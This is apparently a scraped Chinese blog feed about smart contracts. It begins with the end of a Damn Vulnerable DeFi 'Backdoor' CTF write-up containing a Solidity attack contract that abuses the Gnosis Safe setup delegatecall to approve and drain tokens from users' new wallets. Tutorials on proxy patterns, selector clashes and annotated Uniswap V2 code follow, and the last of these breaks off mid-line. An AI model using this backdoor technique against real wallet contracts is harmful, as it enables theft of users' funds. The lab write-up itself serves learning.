BackDoorHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./WalletRegistry.sol&quot;;import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;// 其目的就是为了改变传递链中的msg.sender,使proxy成为msg.sendercontract BackdoorApprover &#123; function approve(address _token, address hacker, uint256 amount) public &#123; IERC20(_token).approve(hacker, amount); &#125;&#125;contract BackDoorHack &#123; uint256 constant PAYMENT_AMOUNT = 10 ether; IERC20 token; GnosisSafeProxyFactory walletFactory; address singleton; WalletRegistry walletRegistry; address[4] users; BackdoorApprover public approver; constructor( address _token, address _walletFactory, address _singleton, address _walletRegistry, address[4] memory _users )&#123; token = IERC20(_token); walletFactory = GnosisSafeProxyFactory(_walletFactory); singleton = _singleton; walletRegistry = WalletRegistry(_walletRegistry); users = _users; approver = new BackdoorApprover(); attack(); &#125; function attack() public &#123; // 授权操作的data bytes memory approve_data = abi.encodeWithSignature(&quot;approve(address,address,uint256)&quot;, token, address(this), PAYMENT_AMOUNT); // 用来给setup函数传参 address[] memory owners = new address[](1); // 遍历每一个用户 for (uint256 i = 0; i &lt; users.length; i++) &#123; owners[0] = users[i]; // 初始化setup的data bytes memory initializer = abi.encodeWithSelector( GnosisSafe.setup.selector, owners, 1, address(approver), approve_data, address(0), address(token), 0, payable(address(msg.sender))); GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(singleton, initializer, i, walletRegistry); token.transferFrom(address(proxy), msg.sender, PAYMENT_AMOUNT); &#125; &#125;&#125; 3.2 challenge.js1234567891011it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ await (await ethers.getContractFactory(&#x27;BackDoorHack&#x27;, player)).deploy( token.address, walletFactory.address, masterCopy.address, walletRegistry.address, users ); &#125;); 运行结果 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Proxy Contract No.1","slug":"DEFI/Proxy/Proxy_Contract","date":"2023-07-19T01:47:10.000Z","updated":"2023-07-19T01:47:10.000Z","comments":true,"path":"2023/07/19/DEFI/Proxy/Proxy_Contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/19/DEFI/Proxy/Proxy_Contract/","excerpt":"","text":"代理合约1. 代理模式 solidity合约部署到链上之后，代码是不可变的。 这一特性存在了一个严重的缺点：就算合约中存在bug，也不能修改或者升级，只能部署新合约。但是新合约的地址和旧合约的地址不一样，而且合约的数据也需要花费大量的gas进行迁移。 为了解决这一问题，从而引入了 代理模式这一概念。 代理模式将合约数据和逻辑分开，分别保存在不同的合约中。以上图为例，数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。逻辑合约（Proxy）通过delegatecall，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。 2. 代理合约它由OpenZeppelin的Proxy合约简化而来。它有三个部分：代理合约Proxy，逻辑合约Logic，和一个调用示例Caller。它的逻辑并不复杂： 首先部署逻辑合约Logic。 创建代理合约Proxy，状态变量implementation记录Logic合约地址。 Proxy合约利用回调函数fallback，将所有调用委托给Logic合约 最后部署调用示例Caller合约，调用Proxy合约。 注意：Logic合约和Proxy合约的状态变量存储结构相同，不然delegatecall会产生意想不到的行为，有安全隐患 逻辑合约Logic implementation：占位变量，与Proxy合约保持一致，防止插槽冲突。 x：uint变量，被设置为99。 CallSuccess事件：在调用成功时释放。 increment()函数：会被Proxy合约调用，释放CallSuccess事件，并返回一个uint，它的selector为0xd09de08a。即 abi.encodeWithSignature(&quot;increment()&quot;)&#x3D; 0xd09de08a。 123456789101112131415/** * @dev 逻辑合约，执行被委托的调用 */contract Logic &#123; address public implementation; // 与Proxy保持一致，防止插槽冲突 uint public x = 99; event CallSuccess(); // 调用成功事件 // 这个函数会释放CallSuccess事件并返回一个uint。 // 函数selector: 0xd09de08a function increment() external returns(uint) &#123; emit CallSuccess(); return x + 1; &#125;&#125; 解读： Logic函数是提供函数的，用于服务调用者，进行一些数据的修改之类的。而逻辑合约也是最容易出现bug或需要升级的合约。 调用者合约Caller它有1个变量，2个函数： proxy：状态变量，记录代理合约地址。 构造函数：在部署合约时初始化proxy变量。 increase()：利用call来调用代理合约的increment()函数，并返回一个uint。在调用时，我们利用abi.encodeWithSignature()获取了increment()函数的selector。在返回时，利用abi.decode()将返回值解码为uint类型。 12345678910111213141516/** * @dev Caller合约，调用代理合约，并获取执行结果 */contract Caller&#123; address public proxy; // 代理合约地址 constructor(address proxy_)&#123; proxy = proxy_; &#125; // 通过代理合约调用increment()函数 function increment() external returns(uint) &#123; ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); return abi.decode(data,(uint)); &#125;&#125; 解读： ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); 表示通过proxy调用 Proxy中的 increment()函数，此时对于Proxy合约来说，msg.data 是 abi.encodeWithSignature(&quot;increment()&quot;) 代理合约Proxy用到了内联汇编，因此比较难理解。它只有一个状态变量，一个构造函数，和一个回调函数。状态变量implementation，在构造函数中初始化，用于保存Logic合约地址。 Proxy的回调函数将外部对本合约的调用委托给 Logic 合约。这个回调函数很别致，它利用内联汇编（inline assembly），让本来不能有返回值的回调函数有了返回值。其中用到的内联汇编操作码： calldatacopy(t, f, s)：将calldata（输入数据）从位置f开始复制s字节到mem（内存）的位置t。 delegatecall(g, a, in, insize, out, outsize)：调用地址a的合约，输入为mem[in..(in+insize)) ，输出为mem[out..(out+outsize))， 提供gwei的以太坊gas。这个操作码在错误时返回0，在成功时返回1。 returndatacopy(t, f, s)：将returndata（输出数据）从位置f开始复制s字节到mem（内存）的位置t。 switch：基础版if/else，不同的情况case返回不同值。可以有一个默认的default情况。 return(p, s)：终止函数执行, 返回数据mem[p..(p+s))。 revert(p, s)：终止函数执行, 回滚状态，返回数据mem[p..(p+s))。 123456789101112131415161718192021222324252627282930313233343536373839404142contract Proxy &#123; address public implementation; // 逻辑合约地址。implementation合约同一个位置的状态变量类型必须和Proxy合约的相同，不然会报错。 /** * @dev 初始化逻辑合约地址 */ constructor(address implementation_)&#123; implementation = implementation_; &#125; /*** @dev 回调函数，将本合约的调用委托给 `implementation` 合约* 通过assembly，让回调函数也能有返回值*/fallback() external payable &#123; address _implementation = implementation; assembly &#123; // 将msg.data拷贝到内存里 // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度 calldatacopy(0, 0, calldatasize()) // 利用delegatecall调用implementation合约 // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度 // output area起始位置和长度位置，所以设为0 // delegatecall成功返回1，失败返回0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // 将return data拷贝到内存 // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度 returndatacopy(0, 0, returndatasize()) switch result // 如果delegate call失败，revert case 0 &#123; revert(0, returndatasize()) &#125; // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes） default &#123; return(0, returndatasize()) &#125; &#125;&#125; 解读： 分析 fallback()函数 123456789101112131415161718192021222324252627fallback() external payable &#123; address _implementation = implementation; assembly &#123; // 将msg.data拷贝到内存里 // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度 calldatacopy(0, 0, calldatasize()) // 利用delegatecall调用implementation合约 // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度 // output area起始位置和长度位置，所以设为0 // delegatecall成功返回1，失败返回0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // 将return data拷贝到内存 // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度 returndatacopy(0, 0, returndatasize()) switch result // 如果delegate call失败，revert case 0 &#123; revert(0, returndatasize()) &#125; // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes） default &#123; return(0, returndatasize()) &#125; &#125; fallback函数用于处理调用者在调用该合约中不具备的函数时被触发。其中的代码逻辑是：内联汇编处理调用者的msg.data，通过解析 msg.data调用其中包含的函数，比如此例中，msg.data便是 函数increment()的选择器，它是用来唯一识别合约中的函数，合约调用哪个函数由调用者决定，即使该合约被部署到链上，但是仍然可以通过传入不同的代理逻辑合约的地址，实现不同的功能。从而实现合约的升级。又由于采用的是 delegatecall的调用方式，使得将作用结果呈现给调用者。 这个代理合约Proxy真的很牛，特别是这个内联汇编的使用，极大的提高了合约的兼容性！！！ Remix演示透明代理 知识点： 如果在代理合约和逻辑合约中有相同的函数（选择器相同），且代理合约通过 delegatecall 去调用逻辑合约中的与代理合约相同的函数时，代理合约会优先调用本合约中的函数。 验证如下： 12345678910111213141516171819202122232425262728293031contract Proxy &#123; uint public result; address logic; constructor(address _logic) &#123; logic = _logic; &#125; function delegatecall() public &#123; result = 999; &#125; fallback() external &#123; (bool success, bytes memory data) = logic.delegatecall(msg.data); &#125;&#125;contract Logic &#123; uint public result; address proxy; // 0xbc957fda function delegatecall() public &#123; result = 666; &#125; function calSelector(string memory _funName) external pure returns(bytes4) &#123; return bytes4(abi.encodeWithSignature(_funName)); &#125;&#125; Proxy 和 Logic 中都有 delegatecall 函数，通过Proxy去调用Logic中的 delegatecall 当然 使用 call来调用也是同理 1. 选择器冲突智能合约中，函数选择器（selector）是函数签名的哈希的前4个字节。例如mint(address account)的选择器为bytes4(keccak256(&quot;mint(address)&quot;))，也就是0x6a627842。更多关于选择器的内容见WTF Solidity极简教程第29讲：函数选择器 由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数： 12345// 选择器冲突的例子contract Foo &#123; function burn(uint256) external &#123;&#125; function collate_propagate_storage(bytes16) external &#123;&#125;&#125; 示例中，函数burn()和collate_propagate_storage()的选择器都为0x42966c68，是一样的，这种情况被称为“选择器冲突”。在这种情况下，EVM无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。 由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的a函数和代理合约的升级函数的选择器相同，那么管理人就会在调用a函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。 如何理解呢，假设在某种情况下，Prxoy中的 upgrade函数的 选择器 abi.encodeWithSignature(upgrade(address))的值，和 msg.data的值相同的话，函数则会选择调用upgrade函数，而不会执行 msg.data中的函数。如若在 msg.data中包含了参数，且该参数是地址类型，执行(bool success, bytes memory data) = implementation.delegatecall(msg.data);则会将合约中的逻辑合约的地址给修改，从而导致合约损坏。 目前，有两个可升级合约标准解决了这一问题：透明代理Transparent Proxy和通用可升级代理UUPS 2. 透明代理概念透明代理的逻辑非常简单：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突： 管理员变为工具人，仅能调用代理合约的可升级函数对合约升级，不能通过回调函数调用逻辑合约。 其它用户不能调用可升级函数，但是可以调用逻辑合约的函数。 3. 代理合约这里的代理合约和第47讲的非常相近，只是fallback()函数限制了管理员地址的调用。 它包含3个变量： implementation：逻辑合约地址。 admin：admin地址。 words：字符串，可以通过逻辑合约的函数改变。 它包含3个函数 构造函数：初始化admin和逻辑合约地址。 fallback()：回调函数，将调用委托给逻辑合约，不能由admin调用。 upgrade()：升级函数，改变逻辑合约地址，只能由admin调用。 12345678910111213141516171819202122232425// 透明可升级合约的教学代码，不要用于生产。contract TransparentProxy &#123; address implementation; // logic合约地址 address admin; // 管理员 string public words; // 字符串，可以通过逻辑合约的函数改变 // 构造函数，初始化admin和逻辑合约地址 constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 // 不能被admin调用，避免选择器冲突引发意外 fallback() external payable &#123; require(msg.sender != admin); (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // 升级函数，改变逻辑合约地址，只能由admin调用 function upgrade(address newImplementation) external &#123; if (msg.sender != admin) revert(); implementation = newImplementation; &#125;&#125; 4. 逻辑合约这里的新、旧逻辑合约与第47讲一样。逻辑合约包含3个状态变量，与保持代理合约一致，防止插槽冲突；包含一个函数foo()，旧逻辑合约会将words的值改为&quot;old&quot;，新的会改为&quot;new&quot;。 12345678910111213141516171819202122232425// 旧逻辑合约contract Logic1 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125;// 新逻辑合约contract Logic2 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器：0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; Remix实现深度学习link 参考博客WTFproxyContract","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"Proxy","slug":"DEFI/Proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/Proxy/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"}]},{"title":"uniswap v2","slug":"DEFI/uniswap/uniswap-v2","date":"2023-07-17T05:47:10.000Z","updated":"2023-07-17T05:47:10.000Z","comments":true,"path":"2023/07/17/DEFI/uniswap/uniswap-v2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/17/DEFI/uniswap/uniswap-v2/","excerpt":"","text":"前言：Uniswap V2代码结构 Uniswap智能合约代码由两个github项目组成。一个是core，一个是periphery。 https://github.com/Uniswap/uniswap-v2-core.git https://github.com/Uniswap/uniswap-v2-periphery.git core偏核心逻辑，单个swap的逻辑。periphery偏外围服务，一个个swap的基础上构建服务。单个swap，两种代币形成的交易对，俗称“池子”。每个交易对有一些基本属性：reserve0&#x2F;reserve1以及total supply。reserve0&#x2F;reserve1是交易对的两种代币的储存量。total supply是当前流动性代币的总量。每个交易对都对应一个流动性代币（LPT - liquidity provider token）。简单的说，LPT记录了所有流动性提供者的贡献。所有流动性代币的总和就是total supply。Uniswap协议的思想是reserve0*reserve1的乘积不变。 Periphery逻辑 核心逻辑实现在UniswapV2Router02.sol中。称为Router，因为Periphery实现了“路由”，支持各个swap之间的连接。基本上实现了三个功能：1&#x2F; add liquidity（增加流动性）2&#x2F;remove liqudity (抽取流动性) 3&#x2F; swap（交换）。 uniswap v2非常重要，必须要非常熟悉该协议！！！ 以下便是对uniswap v2 代码的解读。 v2-core1. UniswapV2ERC20uniswap v2的代币实际上是 ERC20代币。实现ERC20标准方法。 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2ERC20.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;contract UniswapV2ERC20 is IUniswapV2ERC20 &#123; using SafeMath for uint; // 将 SafeMath 库合约用于 uint 类型 string public constant name = &#x27;Uniswap V2&#x27;; // 代币的名字 string public constant symbol = &#x27;UNI-V2&#x27;; // 代币符号 uint8 public constant decimals = 18; uint public totalSupply; // 发行量 // 存储某地址的代币余额，address =&gt; uint的映射 mapping(address =&gt; uint) public balanceOf; // 存储某一地址对另一地址的代币授权量，授权之后可以允许被授权人使用授权人的代币进行转账 `transferFrom` mapping(address =&gt; mapping(address =&gt; uint)) public allowance; // bytes32 public DOMAIN_SEPARATOR; // keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;); bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; // mapping(address =&gt; uint) public nonces; // 两个在授权和转账时会被触发的事件 event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); constructor() public &#123; uint chainId; assembly &#123; // chainid指令用于获取当前区块链的链ID, 它唯一地标识了当前区块链的网络 chainId := chainid &#125; // 初始化 DOMAIN_SEPARATOR 变量 DOMAIN_SEPARATOR = keccak256( abi.encode( keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;), keccak256(bytes(name)), keccak256(bytes(&#x27;1&#x27;)), chainId, address(this) ) ); &#125; /** 1. 铸币操作，因为有库函数的引用，可以直接调用 add,sub等运算 2. totalSupply 发行量时对于整个系统来说，而balance是对于某个账户来说 */ function _mint(address to, uint value) internal &#123; totalSupply = totalSupply.add(value); // 发行量累加 value balanceOf[to] = balanceOf[to].add(value); // to账户的 余额累加 value emit Transfer(address(0), to, value); // 触发交易事件 &#125; /** 1. 销币操作 */ function _burn(address from, uint value) internal &#123; balanceOf[from] = balanceOf[from].sub(value); // from 账户的 余额累减 value totalSupply = totalSupply.sub(value); // 发行量累减 value emit Transfer(from, address(0), value); // 触发交易事件 &#125; /** 1. 授权操作 2. owner一般是调用者，spender则是授权者，value是授权代币量 */ function _approve(address owner, address spender, uint value) private &#123; // 记录owner 对spender 的授权量为 value allowance[owner][spender] = value; emit Approval(owner, spender, value); // 触发授权事件 &#125; /** 1. 转账操作 2. 内置函数_transfer(), from账户向to账户转移 value的代币 3. 而在外部函数中，transfer中的from为合约调用者 */ function _transfer(address from, address to, uint value) private &#123; // from 账户余额减少value balanceOf[from] = balanceOf[from].sub(value); // to 账户余额增加 value balanceOf[to] = balanceOf[to].add(value); emit Transfer(from, to, value); &#125; /** 1. 外部授权操作 2. 外部授权规定了授权者是调用者，予以：&#x27;我&#x27;给spender授权 */ function approve(address spender, uint value) external returns (bool) &#123; _approve(msg.sender, spender, value); return true; &#125; /** 1. 外部转账操作 2. 规定了转账者是调用者，予以：&#x27;我&#x27;给to转账value */ function transfer(address to, uint value) external returns (bool) &#123; _transfer(msg.sender, to, value); return true; &#125; /** 1. 外部转账操作，msg.sender是代理人 2. 在 pragma=0.5.16的版本中，uint(-1)= 115792089237316195423570985008687907853269984665640564039457584007913129639935 3. 要调用该函数，事先要让 from执行approve函数，给msg.sender授权 4. 最后调用_transfer()函数，执行from 向 to 转账 value的操作 */ function transferFrom(address from, address to, uint value) external returns (bool) &#123; if (allowance[from][msg.sender] != uint(-1)) &#123; allowance[from][msg.sender] = allowance[from][msg.sender].sub(value); &#125; _transfer(from, to, value); return true; &#125; /** 1. 许可操作 2. permit函数的作用是将代币授权给指定的目标地址， 使得目标地址可以代表代币持有人进行交易，而无需进行传统的授权交易。 这种新型的授权方法可以提高代币交易的效率和安全性， 同时也可以减少交易的成本和时间。 3. owner授权者，spender被授权者，value代币数目，deadline：授权的截止时间，必须在此时间之前完成授权 nonce：随机数，用于避免授权被重复使用，v、r、s：用于验证授权的签名参数。 */ function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;); bytes32 digest = keccak256( abi.encodePacked( &#x27;\\x19\\x01&#x27;, DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)) ) ); address recoveredAddress = ecrecover(digest, v, r, s); require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;); _approve(owner, spender, value); &#125;&#125; 2. UniswapV2Factory工厂合约，用于创建Pair合约（以及设置协议手续费接收地址） 代码解读如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./UniswapV2Pair.sol&#x27;;contract UniswapV2Factory is IUniswapV2Factory &#123; address public feeTo; // 手续费接收地址 address public feeToSetter; // 手续费接收地址的设置者 /** 如果将 getPair设置为public，则编译的时候会在该合约中默认生成set 和get函数 解读：通过两个地址获取到交易对地址 */ mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 数组，存储所有交易对 address[] public allPairs; // 交易对创建事件 event PairCreated(address indexed token0, address indexed token1, address pair, uint); // 初始化，手续费接收地址的设置者 constructor(address _feeToSetter) public &#123; feeToSetter = _feeToSetter; &#125; // 获取交易对的对数 function allPairsLength() external view returns (uint) &#123; return allPairs.length; &#125; /** 首先将token0 token1按照顺序排序，确保token0字面地址小于token1。 接着使用assembly + create2创建合约。 assembly可以在Solidity中使用Yul语言直接操作EVM，是较底层的操作方法。 《Uniswap v2 白皮书》中讲到，create2主要用于创建确定性的交易对合约地址， 目的是根据两个代币地址直接计算pair地址，而无需调用链上合约查询。 */ function createPair(address tokenA, address tokenB) external returns (address pair) &#123; // 两种代币地址不能相同 require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;); // 先将token0 token1按照顺序排序，确保token0字面地址小于token1 (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); // 确保token0不等于 address(0)，则两个地址都不为 address(0) require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;); // 确保这两种代币地址的交易对为address(0),即这两个代币尚未创建交易对 require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient // 获取 `UniswapV2Pair`的字节码 bytes memory bytecode = type(UniswapV2Pair).creationCode; // 生成盐salt，salt由这两个地址紧打包再hash获得，是唯一的 bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // 通过creat2计算交易对地址 assembly &#123; pair := create2(0, add(bytecode, 32), mload(bytecode), salt) &#125; // 将新生成的交易对中的两种代币设置为 token0, token1 IUniswapV2Pair(pair).initialize(token0, token1); // 记录token0 和 token1生成的交易对 getPair[token0][token1] = pair; // 反向填充映射 getPair[token1][token0] = pair; // populate mapping in the reverse direction // 保存该交易对pair allPairs.push(pair); // 创建成功，触发交易对生成事件 emit PairCreated(token0, token1, pair, allPairs.length); &#125; // 设置手续费接收地址 function setFeeTo(address _feeTo) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeTo = _feeTo; &#125; // 修改手续费接收地址的设置者 function setFeeToSetter(address _feeToSetter) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeToSetter = _feeToSetter; &#125;&#125; 3. UniswapV2Pair Pair（交易对）合约，定义和交易有关的几个最基础方法，如swap&#x2F;mint&#x2F;burn，价格预言机等功能，其本身是一个ERC20合约，继承UniswapV2ERC20 Pair合约主要实现了三个方法：mint（添加流动性）、burn（移除流动性）、swap（兑换）。 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;./UniswapV2ERC20.sol&#x27;;import &#x27;./libraries/Math.sol&#x27;;import &#x27;./libraries/UQ112x112.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./interfaces/IUniswapV2Callee.sol&#x27;;contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123; // 引用库函数 using SafeMath for uint; using UQ112x112 for uint224; // 最低额度的流动性 uint public constant MINIMUM_LIQUIDITY = 10**3; // tansfer函数的选择器 bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;))); // 工厂？token0和token1交易对中的两种代币 address public factory; address public token0; address public token1; // token0和token1交易对中的两种代币的存储量 uint112 private reserve0; // uses single storage slot, accessible via getReserves uint112 private reserve1; // uses single storage slot, accessible via getReserves // 上次更新的时间 uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves // 累加交易价格 uint public price0CumulativeLast; uint public price1CumulativeLast; uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event // 锁标志 uint private unlocked = 1; // 修饰器为了防止异步 modifier lock() &#123; require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;); unlocked = 0; _; unlocked = 1; &#125; // 读取交易对中两种代币的余额，以及上一次交易对更新的时间 function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123; _reserve0 = reserve0; _reserve1 = reserve1; _blockTimestampLast = blockTimestampLast; &#125; /** 1. 通过call的方式，调用token中的 transfer 函数---兼容性更强 2. 判断调用是否成功，success是否为true，data是否为空 */ function _safeTransfer(address token, address to, uint value) private &#123; (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value)); require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;); &#125; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); // 初始化 工厂地址为调用者 constructor() public &#123; factory = msg.sender; &#125; // called once by the factory at time of deployment // 初始化交易对中的两种代币地址 function initialize(address _token0, address _token1) external &#123; require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check token0 = _token0; token1 = _token1; &#125; // update reserves and, on the first call per block, price accumulators function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123; require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;); // 记录当前更新时间 uint32 blockTimestamp = uint32(block.timestamp % 2**32); // 记录过去了多久 uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired // 计算出当前的交易价格 if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123; // * never overflows, and + overflow is desired price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed; price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed; &#125; // 将这两种代币的存储量设置为代币的余额 reserve0 = uint112(balance0); reserve1 = uint112(balance1); // 更新当前操作时间 blockTimestampLast = blockTimestamp; // 触发同步事件 emit Sync(reserve0, reserve1); &#125; // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k) // 计算铸币手续费 function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123; address feeTo = IUniswapV2Factory(factory).feeTo(); // 获取当前factory铸币手续费的接收地址 feeOn = feeTo != address(0); // 检查该factory是否设置了手续费接收地址 uint _kLast = kLast; // gas savings if (feeOn) &#123; // 如果该factory有手续费接收地址 if (_kLast != 0) &#123; uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)); uint rootKLast = Math.sqrt(_kLast); if (rootK &gt; rootKLast) &#123; uint numerator = totalSupply.mul(rootK.sub(rootKLast)); uint denominator = rootK.mul(5).add(rootKLast); uint liquidity = numerator / denominator; if (liquidity &gt; 0) _mint(feeTo, liquidity); // 给feeTo地址铸币liquidity &#125; &#125; &#125; else if (_kLast != 0) &#123; kLast = 0; &#125; &#125; // this low-level function should be called from a contract which performs important safety checks // 铸币操作，添加流动性 function mint(address to) external lock returns (uint liquidity) &#123; // 读取代币的存储量 (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // 获取这两种代币的余额 uint balance0 = IERC20(token0).balanceOf(address(this)); uint balance1 = IERC20(token1).balanceOf(address(this)); // 计算当前合约中两个代币的净增量，并赋值给amount0和amount1变量 // 净增量等于余额减去储备量 uint amount0 = balance0.sub(_reserve0); uint amount1 = balance1.sub(_reserve1); // 调用_mintFee函数，计算是否需要收取协议手续费，并返回一个布尔值，赋值给feeOn变量 bool feeOn = _mintFee(_reserve0, _reserve1); // 理解为支付完铸币费用 // 记录发行量，难道这里也讲究异步的现象？ uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // 如果是首次提供该交易对的流动性，则根据根号xy生成流动性代币，并销毁其中的MINIMUM_LIQUIDITY（即1000wei if (_totalSupply == 0) &#123; // 计算流动性代币的数量，等于两个代币净增量乘积的平方根减去最小流动性常量，并赋值给liquidity变量 liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY); // 调用_mint函数，向零地址铸造最小流动性常量数量的流动性代币（永久锁定） _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens &#125; else &#123; // 计算流动性代币的数量，等于两个代币净增量与储备量比例乘积与总供应量乘积的较小值，并赋值给liquidity变量 liquidity = Math.min(amount0.mul(_totalSupply) / 